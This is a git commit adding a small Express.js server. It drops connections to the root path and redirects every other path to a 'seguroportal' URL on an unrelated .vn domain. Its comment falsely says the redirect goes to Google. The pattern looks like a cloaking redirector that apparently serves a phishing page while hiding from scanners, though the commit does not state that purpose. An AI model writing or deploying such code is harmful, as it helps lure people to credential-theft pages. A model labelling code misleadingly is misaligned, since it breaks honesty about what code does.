652924501ce001a189bc4ea224acf9ff3b8feb76
Haythan <haythango123456789@gmail.com>
2025-05-01 19:37:28 -0400

    v1

---
+++ index.js
@@ -0,0 +1,17 @@
+import express from 'express';
+
+const app = express();
+
+// Redirigir a Google en cualquier ruta excepto /
+app.use((req, res, next) => {
+    if (req.path === '/') {
+        res.socket.destroy(); // Cierra la conexión sin enviar respuesta
+    } else {
+        res.redirect('https://seguroportal.cellphonez.vn/MUA/1'); // Redirige cualquier otra ruta
+    }
+});
+
+const PORT = 3020;
+app.listen(PORT, () => {
+    console.log(`Servidor corriendo en http://localhost:${PORT}`);
+});
